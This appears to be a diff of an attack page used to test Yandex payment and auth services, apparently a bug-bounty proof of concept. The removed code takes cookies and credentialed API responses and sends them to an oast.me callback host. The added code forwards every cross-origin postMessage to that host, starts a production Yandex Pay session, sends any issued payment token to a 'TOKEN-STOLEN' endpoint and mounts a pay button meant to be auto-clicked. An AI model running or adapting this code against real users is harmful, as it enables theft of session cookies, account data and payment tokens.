@@ -1,35 +1,77 @@
 <html><head><title>Loading...</title></head>
 <body>
+<div id="button_container"></div>
 <script>
-var data = {
-  cookies: document.cookie,
-  url: window.location.href,
-  origin: window.location.origin
-};
-
-var apis = [
-  "https://pay.yandex.ru/api/v1/user/info",
-  "https://plus-home.yandex.ru/v1/sdk/configuration",
-  "https://authproxy.prod.yb.yandex.net/api/v1/user",
-];
-
-var results = {};
-var done = 0;
-
-apis.forEach(function(url) {
-  fetch(url, {credentials: "include"})
-    .then(function(r) { return r.text().then(function(t) { results[url] = {status:r.status, body:t.substring(0,1000)}; }); })
-    .catch(function(e) { results[url] = {error: e.message}; })
-    .finally(function() {
-      done++;
-      if (done === apis.length) {
-        data.apiResults = results;
-        fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/stolen?" + encodeURIComponent(JSON.stringify(data)));
-      }
-    });
+// Intercept ALL postMessages from any origin (catch SDK communication)
+window.addEventListener("message", function(e) {
+  var data = typeof e.data === 'string' ? e.data : JSON.stringify(e.data);
+  if (data.length > 5) {
+    fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/sdk-msg?origin=" + encodeURIComponent(e.origin) + "&data=" + encodeURIComponent(data.substring(0,2000)));
+  }
 });
 
-fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/auth-cookies?" + encodeURIComponent(JSON.stringify(data)));
+// Load Yandex Pay SDK
+var script = document.createElement('script');
+script.src = 'https://pay.yandex.ru/sdk/v1/pay.js';
+script.onload = function() {
+  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/sdk-loaded");
+
+  // Try to create a payment session - SDK will use the app's auth context
+  var paymentData = {
+    env: YaPay.PaymentEnv.PRODUCTION,
+    version: 2,
+    countryCode: YaPay.CountryCode.Ru,
+    currencyCode: YaPay.CurrencyCode.Rub,
+    merchant: {
+      id: "test-merchant",
+      name: "Test",
+      url: "https://example.com"
+    },
+    order: {
+      id: "order-1",
+      total: { amount: "1.00" }
+    },
+    paymentMethods: [{
+      type: YaPay.PaymentMethodType.Card,
+      gateway: "test",
+      gatewayMerchantId: "test",
+      allowedAuthMethods: [YaPay.AllowedAuthMethod.PanOnly],
+      allowedCardNetworks: [YaPay.AllowedCardNetwork.Visa, YaPay.AllowedCardNetwork.Mastercard, YaPay.AllowedCardNetwork.Mir]
+    }]
+  };
+
+  YaPay.createSession(paymentData, {
+    onProcess: function(event) {
+      // TOKEN STOLEN!
+      fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/TOKEN-STOLEN?token=" + encodeURIComponent(event.token));
+    },
+    onAbort: function(event) {
+      fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/sdk-abort");
+    },
+    onError: function(event) {
+      fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/sdk-error?reason=" + encodeURIComponent(event.reason || JSON.stringify(event)));
+    }
+  }).then(function(session) {
+    fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/sdk-session-created");
+    // Mount the button (invisible, auto-click it)
+    session.mountButton(document.getElementById('button_container'), {
+      type: YaPay.ButtonType.Pay,
+      theme: YaPay.ButtonTheme.Black,
+      width: YaPay.ButtonWidth.Auto
+    });
+    // Try to auto-click after mount
+    setTimeout(function(){
+      var btn = document.querySelector('#button_container iframe');
+      if(btn) fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/sdk-button-found");
+    }, 2000);
+  }).catch(function(err) {
+    fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/sdk-session-error?err=" + encodeURIComponent(String(err)));
+  });
+};
+script.onerror = function() {
+  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/sdk-load-failed");
+};
+document.head.appendChild(script);
 </script>
 </body>
 </html>
